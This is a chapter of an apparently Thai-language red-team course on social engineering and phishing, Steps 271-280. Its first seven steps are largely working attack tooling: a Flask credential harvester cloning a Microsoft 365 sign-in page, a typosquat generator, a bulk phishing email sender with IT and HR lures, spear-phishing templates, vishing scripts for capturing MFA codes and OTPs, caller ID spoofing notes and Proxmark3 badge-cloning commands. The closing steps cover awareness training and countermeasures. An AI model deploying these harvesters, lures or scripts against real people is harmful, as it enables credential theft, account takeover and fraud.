# Part 28: Social Engineering & Phishing (Steps 271-280)

## ภาพรวม
ส่วนนี้ครอบคลุมเทคนิค Social Engineering และ Phishing ที่ใช้ในการทดสอบ Red Team Operations รวมถึง Phishing Infrastructure, Spear Phishing, Vishing, Smishing และ Employee Security Awareness Assessment

**หมายเหตุ:** เนื้อหานี้เป็นเพื่อการศึกษา Security Awareness และ Red Team Assessment ที่ได้รับอนุญาตเท่านั้น

---

## Step 271: Phishing Infrastructure Setup

### Phishing Infrastructure Components
```
Phishing Infrastructure:
┌──────────────────────────────────────────────┐
│  Components:                                     │
│  • Domain registrar (similar-looking domain)    │
│  • VPS/Cloud server (offshore)                  │
│  • SSL certificate (Let's Encrypt)              │
│  • Email delivery (SendGrid, Mailgun)            │
│  • Phishing kit (cloned pages)                  │
│  • Tracking pixels                              │
│  • Redirector servers                           │
│  • Credential harvester backend                 │
└──────────────────────────────────────────────┘
```

### GoPhish - Phishing Framework
```bash
# ดาวน์โหลด GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip -d /opt/gophish
chmod +x /opt/gophish/gophish

# Configuration
cat /opt/gophish/config.json
# แก้ไข admin_server.listen_url: 0.0.0.0:3333
# แก้ไข phish_server.listen_url: 0.0.0.0:80

# รัน GoPhish
/opt/gophish/gophish
# เข้า: https://localhost:3333
# Default creds: admin/gophish

# สิ่งที่ต้องตั้งใน GoPhish:
# 1. Sending Profile (SMTP config)
# 2. Landing Page (clone target site)
# 3. Email Template (phishing email)
# 4. Users & Groups (target list)
# 5. Campaign (combine all above)
```

### Credential Harvester Setup
```python
#!/usr/bin/env python3
# credential_harvester.py

from flask import Flask, request, redirect, render_template_string
import json
import datetime
import os

app = Flask(__name__)
HARVESTED_CREDS = []

LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft 365 - Sign In</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f3f2f1; }
        .container { max-width: 440px; margin: 50px auto; padding: 30px; background: white; }
        .logo { text-align: center; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
        button { width: 100%; padding: 10px; background: #0078d4; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">
        <h2>Microsoft 365</h2>
    </div>
    <form method="POST" action="/login">
        <input type="email" name="email" placeholder="Email address" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Sign in</button>
    </form>
</div>
</body>
</html>
"""

@app.route('/', methods=['GET'])
def index():
    return render_template_string(LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def capture_creds():
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    timestamp = datetime.datetime.now().isoformat()
    
    cred = {
        'timestamp': timestamp,
        'email': email,
        'password': password,
        'ip': ip,
        'user_agent': user_agent
    }
    
    HARVESTED_CREDS.append(cred)
    
    # Log to file
    with open('harvested_creds.json', 'a') as f:
        f.write(json.dumps(cred) + '\n')
    
    print(f"[!] Captured: {email}:{password} from {ip}")
    
    # Redirect to real site
    return redirect('https://www.microsoft.com', 302)

@app.route('/creds', methods=['GET'])
def view_creds():
    # เพิ่ม authentication ในการ deploy จริง
    return json.dumps(HARVESTED_CREDS, indent=2)

if __name__ == '__main__':
    # เพิ่ม SSL certificate ในการ deploy จริง
    app.run(host='0.0.0.0', port=80, debug=False)
```

---

## Step 272: Domain Spoofing และ Typosquatting

### Domain Analysis เพื่อ Phishing
```python
#!/usr/bin/env python3
# domain_analysis.py

import itertools
import socket

class DomainAnalyzer:
    def __init__(self, target_domain):
        self.target = target_domain
        self.base = target_domain.split('.')[0]
        self.tld = '.'.join(target_domain.split('.')[1:])
    
    def generate_typosquats(self):
        """สร้าง typosquat variations"""
        variations = []
        
        # Adjacent key substitutions (QWERTY)
        key_adjacents = {
            'a': 'sqwz', 'b': 'vghn', 'c': 'xdfv', 'd': 'serfcx',
            'e': 'wsrd', 'f': 'dcgtrv', 'g': 'fhtyb', 'h': 'gyujn',
            'i': 'ujko', 'j': 'huikn', 'k': 'jilom', 'l': 'kop',
            'm': 'nkj', 'n': 'bhjm', 'o': 'iklp', 'p': 'ol',
            'q': 'wa', 'r': 'edft', 's': 'awedxz', 't': 'rfgy',
            'u': 'yhij', 'v': 'cfgb', 'w': 'qas', 'x': 'zsdc',
            'y': 'tghu', 'z': 'asx'
        }
        
        base = self.base.lower()
        
        # Typo: adjacent key substitution
        for i, char in enumerate(base):
            if char in key_adjacents:
                for adjacent in key_adjacents[char]:
                    typo = base[:i] + adjacent + base[i+1:]
                    variations.append(f"{typo}.{self.tld}")
        
        # Homograph attacks
        homographs = {
            'a': ['@', '4', 'а'],
            'o': ['0', 'о'],
            'l': ['1', 'I', '|'],
            'e': ['3', 'е'],
            'i': ['1', '!', 'í'],
            's': ['5', '$'],
        }
        
        for i, char in enumerate(base):
            if char in homographs:
                for homograph in homographs[char]:
                    typo = base[:i] + str(homograph) + base[i+1:]
                    variations.append(f"{typo}.{self.tld}")
        
        # Missing/extra characters
        for i in range(len(base)):
            variations.append(f"{base[:i] + base[i+1:]}.{self.tld}")  # missing char
        
        # TLD variations
        tld_variations = ['.com', '.net', '.org', '.co', '.io', '.xyz', '.info']
        for tld in tld_variations:
            if tld != f'.{self.tld}':
                variations.append(f"{base}{tld}")
        
        # Prefix/suffix
        prefixes = ['login-', 'secure-', 'account-', 'mail-', 'support-']
        suffixes = ['-login', '-secure', '-account', '-support']
        
        for prefix in prefixes:
            variations.append(f"{prefix}{base}.{self.tld}")
        for suffix in suffixes:
            variations.append(f"{base}{suffix}.{self.tld}")
        
        return list(set(variations))
    
    def check_domains_registered(self, domains):
        """ตรวจสอบว่า domain ถูก register แล้วหรือไม่"""
        registered = []
        available = []
        
        for domain in domains[:20]:  # Limit to 20
            try:
                socket.gethostbyname(domain)
                registered.append(domain)
                print(f"[!] REGISTERED: {domain}")
            except socket.gaierror:
                available.append(domain)
        
        return registered, available
    
    def analyze_spf_dmarc(self, domain):
        """ตรวจสอป SPF, DMARC ของ target"""
        import dns.resolver
        
        print(f"[*] Checking email security for {domain}...")
        
        # SPF
        try:
            spf = dns.resolver.resolve(domain, 'TXT')
            for record in spf:
                txt = record.to_text()
                if 'v=spf1' in txt:
                    print(f"  SPF: {txt}")
                    if 'all' in txt:
                        if '+all' in txt:
                            print("  [!] SPF +all = Anyone can send email!")
                        elif '~all' in txt:
                            print("  [!] SPF ~all = Soft fail (weak protection)")
                        elif '-all' in txt:
                            print("  [+] SPF -all = Hard fail (strict)")
        except Exception as e:
            print(f"  [-] No SPF: {e}")
        
        # DMARC
        try:
            dmarc = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
            for record in dmarc:
                print(f"  DMARC: {record.to_text()}")
        except:
            print("  [!] No DMARC record")

# การใช้งาน
if __name__ == '__main__':
    analyzer = DomainAnalyzer('microsoft.com')
    variations = analyzer.generate_typosquats()
    
    print(f"[*] Generated {len(variations)} typosquat variations")
    print("[*] First 10:")
    for v in variations[:10]:
        print(f"  - {v}")
    
    registered, available = analyzer.check_domains_registered(variations[:10])
    analyzer.analyze_spf_dmarc('microsoft.com')
```

---

## Step 273: Email Phishing Campaign

### Phishing Email Generator
```python
#!/usr/bin/env python3
# phishing_email_generator.py

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
import csv

class PhishingEmailGenerator:
    def __init__(self, smtp_server, smtp_port, username, password):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password
    
    def generate_it_alert_email(self, recipient_name, recipient_email, 
                                 phishing_url, from_email, from_name):
        """สร้าง IT Alert phishing email"""
        html_body = f"""
<!DOCTYPE html>
<html>
<body style="font-family: Arial, sans-serif; color: #333;">
<div style="max-width: 600px; margin: 0 auto; border: 1px solid #ddd; padding: 20px;">
    <div style="background: #0078d4; padding: 15px; text-align: center;">
        <h2 style="color: white;">IT Security Alert</h2>
    </div>
    
    <div style="padding: 20px;">
        <p>Dear {recipient_name},</p>
        
        <p>Our security systems have detected <strong>unusual login activity</strong> 
        on your account. To secure your account, please verify your identity 
        within 24 hours.</p>
        
        <div style="text-align: center; margin: 30px 0;">
            <a href="{phishing_url}" 
               style="background: #0078d4; color: white; padding: 12px 30px; 
                      text-decoration: none; border-radius: 5px;">
                Verify My Account
            </a>
        </div>
        
        <p>If you did not receive this email, please contact IT Support at ext. 5000.</p>
        
        <p>Best regards,<br>IT Security Team</p>
    </div>
</div>
</body>
</html>
"""
        msg = MIMEMultipart('alternative')
        msg['Subject'] = '[URGENT] Security Alert - Action Required'
        msg['From'] = f'{from_name} <{from_email}>'
        msg['To'] = recipient_email
        msg['X-Priority'] = '1'
        
        msg.attach(MIMEText(html_body, 'html'))
        return msg
    
    def generate_hr_bonus_email(self, recipient_name, recipient_email,
                                phishing_url, from_email):
        """สร้าง HR bonus notification phishing email"""
        html_body = f"""
<!DOCTYPE html>
<html>
<body style="font-family: Arial, sans-serif;">
<p>Dear {recipient_name},</p>
<p>We are pleased to inform you that your <strong>annual performance bonus</strong> 
has been approved. Please click below to review your bonus details and complete 
the bank transfer information.</p>
<p><a href="{phishing_url}">View Bonus Details</a></p>
<p>Please complete this by end of day Friday.</p>
<p>Best regards,<br>HR Department</p>
</body>
</html>
"""
        msg = MIMEMultipart('alternative')
        msg['Subject'] = 'Your Annual Bonus - Action Required by Friday'
        msg['From'] = from_email
        msg['To'] = recipient_email
        msg.attach(MIMEText(html_body, 'html'))
        return msg
    
    def send_campaign(self, targets_csv, email_template_func, phishing_url, 
                       from_email, from_name):
        """ส่ง phishing campaign จาก CSV"""
        print(f"[*] Starting phishing campaign...")
        
        sent = []
        failed = []
        
        with open(targets_csv) as f:
            reader = csv.DictReader(f)
            for row in reader:
                name = row.get('name', 'User')
                email = row.get('email', '')
                
                if not email:
                    continue
                
                try:
                    msg = email_template_func(
                        recipient_name=name,
                        recipient_email=email,
                        phishing_url=phishing_url,
                        from_email=from_email,
                        from_name=from_name
                    )
                    
                    with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                        server.starttls()
                        server.login(self.username, self.password)
                        server.send_message(msg)
                    
                    sent.append(email)
                    print(f"  [+] Sent to: {email}")
                
                except Exception as e:
                    failed.append({'email': email, 'error': str(e)})
                    print(f"  [-] Failed: {email}: {e}")
        
        print(f"\n[*] Campaign complete: {len(sent)} sent, {len(failed)} failed")
        return sent, failed

# ตัวอย่างการใช้งาน
if __name__ == '__main__':
    generator = PhishingEmailGenerator(
        smtp_server='smtp.sendgrid.net',
        smtp_port=587,
        username='apikey',
        password='SENDGRID_API_KEY'
    )
    
    # ส่ง campaign (ต้องมี targets.csv)
    # generator.send_campaign(
    #     'targets.csv',
    #     generator.generate_it_alert_email,
    #     'https://phish.example.com/login',
    #     'security@company-noreply.com',
    #     'IT Security'
    # )
```

---

## Step 274: Spear Phishing และ Whaling

### OSINT เพื่อ Spear Phishing
```python
#!/usr/bin/env python3
# spear_phishing_osint.py

import requests
import json

class SpearPhishingOSINT:
    def __init__(self, target_name, target_company):
        self.name = target_name
        self.company = target_company
        self.profile = {}
    
    def gather_linkedin_info(self):
        """LinkedIn OSINT (manual process)"""
        print(f"[*] LinkedIn search for {self.name} at {self.company}:")
        print(f"  Search: site:linkedin.com '{self.name}' '{self.company}'")
        print(f"  Look for: Job title, department, connections, recent posts")
        
        self.profile.update({
            'linkedin_searched': True,
            'search_query': f"site:linkedin.com '{self.name}' '{self.company}'"
        })
    
    def gather_email_from_format(self, domain):
        """Guess email format from company"""
        name_parts = self.name.lower().split()
        first = name_parts[0] if name_parts else ''
        last = name_parts[-1] if len(name_parts) > 1 else ''
        
        email_formats = [
            f"{first}.{last}@{domain}",
            f"{first[0]}{last}@{domain}",
            f"{last}.{first}@{domain}",
            f"{first}@{domain}",
            f"{first}{last}@{domain}",
            f"{first[0]}.{last}@{domain}"
        ]
        
        print(f"[*] Possible email formats:")
        for fmt in email_formats:
            print(f"  - {fmt}")
        
        return email_formats
    
    def generate_personalized_email(self, target_info):
        """สร้าง personalized spear phishing email"""
        
        # ดึงข้อมูลส่วนตัว
        name = target_info.get('name', 'Colleague')
        position = target_info.get('position', 'Manager')
        company = target_info.get('company', 'Company')
        recent_event = target_info.get('recent_event', 'the conference')
        mutual_contact = target_info.get('mutual_contact', 'John Smith')
        
        email = f"""
Subject: Following up from {recent_event}

Hi {name},

It was great meeting you at {recent_event} last week. I spoke with {mutual_contact} 
who mentioned that you're leading the {position} initiatives at {company}.

I'd love to share some resources that could help with your projects. I've put 
together a document that outlines some best practices:

[Click here to view the document]

Let me know if you'd like to discuss further over coffee.

Best,
Sarah Johnson
[Fake Title] at [Fake Company]
"""
        return email
    
    def check_social_media_presence(self):
        """Check social media for target info"""
        platforms = {
            'Twitter': f'site:twitter.com "{self.name}"',
            'GitHub': f'site:github.com "{self.name}"',
            'Facebook': f'site:facebook.com "{self.name}"',
            'Instagram': f'site:instagram.com "{self.name}"'
        }
        
        print(f"[*] Social media search queries for {self.name}:")
        for platform, query in platforms.items():
            print(f"  {platform}: {query}")

# การใช้งาน
if __name__ == '__main__':
    target = SpearPhishingOSINT('John Doe', 'ACME Corporation')
    target.gather_linkedin_info()
    target.gather_email_from_format('acme.com')
    target.check_social_media_presence()
    
    personalized_email = target.generate_personalized_email({
        'name': 'John',
        'position': 'IT Director',
        'company': 'ACME Corp',
        'recent_event': 'SecureCon 2024',
        'mutual_contact': 'Mike Wilson'
    })
    print("\n[*] Generated spear phishing email:")
    print(personalized_email)
```

---

## Step 275: Vishing (Voice Phishing)

### Vishing Scripts และ Techniques
```python
#!/usr/bin/env python3
# vishing_toolkit.py

class VishingToolkit:
    def __init__(self):
        self.scripts = {}
    
    def it_helpdesk_script(self):
        """สคริปต์ IT Helpdesk Impersonation"""
        return """
=== IT Helpdesk Vishing Script ===

Scenario: Reset password / MFA bypass

Opening:
"Hello, this is [Name] from IT Support. Am I speaking with [Target Name]?"

Problem Statement:
"We've detected some unusual activity on your account and need to verify
your identity to prevent unauthorized access."

Verification (to seem legitimate):
"Can you confirm your employee ID? Great. And which department are you in?"

Request:
"I'm going to send you a temporary code to your mobile number ending in [last 4 digits]
- can you read that back to me?" (This is actually the MFA code)

Alt: "I need you to go to our company portal at [phishing URL] and reset your password."

Closing:
"Everything looks good now. If you have any issues, please call ext. 5000."

Key Techniques:
- Authority: Claim to be IT/Security team
- Urgency: 'Account will be locked in 2 hours'
- Reciprocity: 'I'm trying to help you'
- Social Proof: Name-drop other employees
"""
    
    def bank_fraud_script(self):
        """Bank fraud department script"""
        return """
=== Bank Fraud Department Script ===

Scenario: Account verification / OTP capture

Opening:
"Hello, may I speak with [Name]? This is [Name] from [Bank] Fraud Prevention."

"We've flagged a suspicious transaction of $[amount] at [merchant] at [time].
Did you authorize this?"

If 'No':
"For your protection, I need to verify your identity. Can you confirm your
date of birth and the last 4 digits of your SSN?"

OTP Capture:
"I'm sending a one-time code to your registered mobile. Please read it to me
so I can verify your account is secure."

Note: Never do this maliciously. Educational example of what attackers do.
"""
    
    def generate_caller_id_notes(self, target_company):
        """Notes สำหรับ Caller ID spoofing"""
        return f"""
=== Caller ID Spoofing for {target_company} ===

Tools for authorized Red Team testing:
- SpoofCard (commercial service)
- FreePBX/Asterisk (self-hosted)
- Twilio Programmable Voice

Make calls appear to come from:
- Main company number
- IT department extension
- HR department number
- Executive's direct line

Legal Note: Caller ID spoofing laws vary by country.
Only use for authorized security assessments.
"""

# การใช้งาน
if __name__ == '__main__':
    vishing = VishingToolkit()
    print(vishing.it_helpdesk_script())
```

---

## Step 276: Physical Security Assessment

### Physical Penetration Testing
```python
#!/usr/bin/env python3
# physical_security_assessment.py

class PhysicalSecurityAssessment:
    def __init__(self):
        self.findings = []
    
    def tailgating_test(self):
        """ทดสอบ Tailgating awareness"""
        return """
=== Tailgating Test ===

Objective: Test if employees hold doors for unauthorized persons

Scenarios:
1. Hands-full approach
   - Carry boxes/coffee, approach main entrance
   - See if employees hold door without badge check

2. Delivery person
   - Wear delivery uniform
   - Carry packages, claim delivery

3. New employee
   - Claim to be new employee without badge yet

4. IT repair person
   - Claim to be there to fix equipment

Documentation:
- Record success/failure for each scenario
- Note employee reaction
- Identify access control gaps
"""
    
    def badge_cloning_techniques(self):
        """เทคนิคการ clone badge"""
        return """
=== Badge Cloning Techniques ===

RFID/Proximity Card Cloning:

Tools:
- Proxmark3 - professional RFID research tool
- HID card readers (26-bit Wiegand format)
- ChameleonMini/Tiny

Commands (Proxmark3):
proxmark3> hw version     # check firmware
proxmark3> lf search      # search for LF tags
proxmark3> lf hid read    # read HID card
proxmark3> lf hid clone -r CARD_DATA  # clone to T55x7

HF (13.56 MHz) cards:
proxmark3> hf search      # find HF tag type
proxmark3> hf mf autopwn  # crack MIFARE Classic
proxmark3> hf mf esave    # save card data
proxmark3> hf mf eload    # load to emulator

Defenses:
- Multi-factor physical auth (badge + PIN)
- Encrypted RFID (MIFARE DESFire)
- Anti-cloning features
"""
    
    def dumpster_diving_checklist(self):
        """Dumpster diving information gathering"""
        return """
=== Dumpster Diving Checklist ===

What to look for:
[ ] Organization charts
[ ] Phone directories  
[ ] Sticky notes with passwords
[ ] Old hardware (hard drives, USB)
[ ] Printed documents with PII
[ ] Meeting notes
[ ] Project plans
[ ] Network diagrams
[ ] ID badges (expired)
[ ] Software licenses

Legal Note: Check local laws before performing dumpster diving.
Obtain written authorization for red team engagements.
"""

# การใช้งาน
if __name__ == '__main__':
    assessment = PhysicalSecurityAssessment()
    print(assessment.tailgating_test())
    print(assessment.badge_cloning_techniques())
```

---

## Step 277: Smishing (SMS Phishing)

### SMS Phishing Techniques
```python
#!/usr/bin/env python3
# smishing_simulator.py
# สำหรับ authorized testing เท่านั้น

class SmishingSimulator:
    def generate_sms_templates(self):
        """สร้างตัวอย่าง SMS phishing templates"""
        templates = [
            {
                'type': 'Bank Alert',
                'message': '[BANK] Your account has been temporarily suspended. Verify now: {url}',
                'urgency': 'High'
            },
            {
                'type': 'Package Delivery',
                'message': 'Your package is held at customs. Pay duty fee: {url}',
                'urgency': 'Medium'
            },
            {
                'type': 'COVID/Health',
                'message': '[Health Authority] You have been in contact with COVID-19. View: {url}',
                'urgency': 'High'
            },
            {
                'type': 'Prize Won',
                'message': 'Congrats! You won $500 gift card. Claim before: {url}',
                'urgency': 'Low'
            },
            {
                'type': 'IT Alert',
                'message': 'Company IT: Password expires today. Reset: {url}',
                'urgency': 'High'
            }
        ]
        return templates
    
    def analyze_smishing_indicators(self, sms_message):
        """วิเคราะห์ SMS ว่า phishing หรือไม่"""
        indicators = []
        
        checks = [
            ('http://', 'Non-HTTPS URL (suspicious)'),
            ('bit.ly', 'URL shortener used'),
            ('tinyurl', 'URL shortener used'),
            ('URGENT', 'Urgency language'),
            ('immediately', 'Urgency language'),
            ('expire', 'Expiration pressure'),
            ('suspended', 'Account threat'),
            ('verify', 'Verification request'),
            ('click here', 'Generic CTA'),
            ('won', 'Prize claim'),
            ('congratulation', 'Prize claim'),
        ]
        
        for keyword, indicator in checks:
            if keyword.lower() in sms_message.lower():
                indicators.append(indicator)
        
        if indicators:
            print(f"[!] Potential smishing indicators:")
            for ind in indicators:
                print(f"  - {ind}")
        else:
            print("[+] No obvious phishing indicators")
        
        return indicators

# การใช้งาน
if __name__ == '__main__':
    simulator = SmishingSimulator()
    
    templates = simulator.generate_sms_templates()
    for t in templates:
        print(f"\n[{t['type']}] ({t['urgency']})")
        print(f"  {t['message']}")
    
    print("\n[*] Testing smishing detection:")
    simulator.analyze_smishing_indicators(
        '[BANK] URGENT: Your account suspended. Verify at http://bit.ly/xyz immediately'
    )
```

---

## Step 278: Social Engineering Defense Training

### Security Awareness Program
```python
#!/usr/bin/env python3
# security_awareness_trainer.py

class SecurityAwarenessTrainer:
    def create_awareness_quiz(self):
        """สร้างแบบทดสอบ Security Awareness"""
        questions = [
            {
                'question': 'You receive an urgent email from "IT Support" asking for your password. What should you do?',
                'options': [
                    'Provide your password immediately',
                    'Reply and ask why they need it',
                    'Call IT support directly using the official number to verify',
                    'Ignore the email'
                ],
                'correct': 2,
                'explanation': 'IT staff will NEVER ask for your password. Always verify requests through official channels.'
            },
            {
                'question': 'Someone calls claiming to be from your bank and asks for your OTP. What should you do?',
                'options': [
                    'Provide the OTP to help verify your identity',
                    'Hang up and call your bank using the number on your card',
                    'Give the first few digits only',
                    'Ask them to call back later'
                ],
                'correct': 1,
                'explanation': 'Banks NEVER ask for OTPs over the phone. Always call back using the official number.'
            },
            {
                'question': 'You find a USB drive in the parking lot. What should you do?',
                'options': [
                    'Plug it in to see who it belongs to',
                    'Keep it since it might be valuable',
                    'Hand it to IT/Security department without plugging it in',
                    'Trash it'
                ],
                'correct': 2,
                'explanation': 'Attackers leave USB drives hoping someone plugs them in. Always hand to IT/Security.'
            }
        ]
        return questions
    
    def phishing_indicators_guide(self):
        """คู่มือสังเกต phishing"""
        return """
=== Phishing Indicators Guide ===

Email Red Flags:
• Sender email doesn't match company domain
• Generic greeting (Dear Customer/User)
• Urgent language (Act Now! expires in 24hrs)
• Requests for passwords/MFA codes
• Unexpected attachments (especially .exe/.zip)
• Links that don't match visible URL
• Poor grammar/spelling
• Suspicious sender name with odd email

URL Red Flags:
• HTTP instead of HTTPS
• Long, unusual URL paths
• URL shorteners (bit.ly, tinyurl)
• Misspelled domain (micros0ft.com, paypa1.com)
• Extra subdomains (login.paypal.com.evil.com)

What To Do:
1. Stop - don't click links
2. Think - does this make sense?
3. Call - verify via phone if unsure
4. Report - forward to security@company.com
"""

# การใช้งาน
if __name__ == '__main__':
    trainer = SecurityAwarenessTrainer()
    print(trainer.phishing_indicators_guide())
```

---

## Step 279: Phishing Campaign Metrics

### Campaign Analytics
```python
#!/usr/bin/env python3
# phishing_campaign_metrics.py

from datetime import datetime
import json

class CampaignMetrics:
    def __init__(self, campaign_name):
        self.campaign = campaign_name
        self.stats = {
            'sent': 0,
            'opened': 0,
            'clicked': 0,
            'submitted_creds': 0,
            'reported': 0
        }
        self.timeline = []
    
    def record_event(self, event_type, user_email, timestamp=None):
        """บันทึก event"""
        if timestamp is None:
            timestamp = datetime.now().isoformat()
        
        self.timeline.append({
            'type': event_type,
            'email': user_email,
            'timestamp': timestamp
        })
        
        if event_type in self.stats:
            self.stats[event_type] += 1
    
    def calculate_metrics(self):
        """คำนวณ metrics"""
        sent = self.stats['sent']
        if sent == 0:
            return {}
        
        return {
            'total_sent': sent,
            'open_rate': f"{self.stats['opened'] / sent * 100:.1f}%",
            'click_rate': f"{self.stats['clicked'] / sent * 100:.1f}%",
            'submission_rate': f"{self.stats['submitted_creds'] / sent * 100:.1f}%",
            'report_rate': f"{self.stats['reported'] / sent * 100:.1f}%",
            'susceptibility_score': self.stats['submitted_creds'] / sent * 100
        }
    
    def generate_report(self):
        metrics = self.calculate_metrics()
        
        report = f"""
=== Phishing Campaign Report: {self.campaign} ===

Date: {datetime.now().strftime('%Y-%m-%d')}

Campaign Statistics:
  Emails Sent:        {self.stats['sent']}
  Emails Opened:      {self.stats['opened']} ({metrics.get('open_rate', 'N/A')})
  Links Clicked:      {self.stats['clicked']} ({metrics.get('click_rate', 'N/A')})
  Credentials Entered:{self.stats['submitted_creds']} ({metrics.get('submission_rate', 'N/A')})
  Reported to IT:     {self.stats['reported']} ({metrics.get('report_rate', 'N/A')})

Susceptibility Score: {metrics.get('susceptibility_score', 0):.1f}% (lower is better)

Industry Benchmark:
  Open Rate: 30-40%
  Click Rate: 10-20%
  Submission Rate: 5-15%
  
Recommendations:
"""
        
        if metrics.get('susceptibility_score', 0) > 20:
            report += "  [HIGH RISK] Implement mandatory phishing training\n"
        elif metrics.get('susceptibility_score', 0) > 10:
            report += "  [MEDIUM RISK] Refresh security awareness training\n"
        else:
            report += "  [LOW RISK] Security awareness is adequate, continue monitoring\n"
        
        return report

# การใช้งาน
if __name__ == '__main__':
    campaign = CampaignMetrics('Q1 2024 Security Assessment')
    
    # Simulate campaign data
    for i in range(100):  # 100 sent
        campaign.record_event('sent', f'user{i}@company.com')
    
    for i in range(45):   # 45 opened
        campaign.record_event('opened', f'user{i}@company.com')
    
    for i in range(23):   # 23 clicked
        campaign.record_event('clicked', f'user{i}@company.com')
    
    for i in range(12):   # 12 submitted creds
        campaign.record_event('submitted_creds', f'user{i}@company.com')
    
    for i in range(5):    # 5 reported
        campaign.record_event('reported', f'user{i+50}@company.com')
    
    print(campaign.generate_report())
```

---

## Step 280: Social Engineering Summary และ Countermeasures

### Countermeasures และ Controls
```
Social Engineering Defenses:

 Technical Controls:
 • Email security: SPF, DKIM, DMARC
 • Email filtering: Proofpoint, Mimecast
 • URL rewriting and inspection
 • Browser phishing protection
 • MFA for all accounts
 • Password managers
 • Phishing-resistant MFA (FIDO2/WebAuthn)

 Procedural Controls:
 • Verification procedures for sensitive requests
 • 4-eyes principle for financial transactions
 • Clear reporting procedures
 • Regular security awareness training
 • Tabletop exercises

 Detection Controls:
 • SIEM alerts for suspicious logins
 • Impossible travel alerts
 • New device login alerts
 • Email header analysis

 People Controls:
 • Security culture
 • "If in doubt, don't"
 • Reward reporting
 • No punishment for reporting (even if wrong)
```

---

## สรุป Part 28

| Step | หัวข้อ | เครื่องมือหลัก |
|------|--------|---------------|
| 271 | Phishing Infrastructure | GoPhish, credential harvester |
| 272 | Domain Spoofing | Typosquat generator, SPF/DMARC check |
| 273 | Email Phishing | Campaign framework |
| 274 | Spear Phishing | OSINT-based targeting |
| 275 | Vishing | Call scripts, techniques |
| 276 | Physical Security | Tailgating, RFID cloning |
| 277 | Smishing | SMS phishing templates |
| 278 | Security Awareness | Training materials |
| 279 | Campaign Metrics | Analytics framework |
| 280 | Countermeasures | Defense strategies |
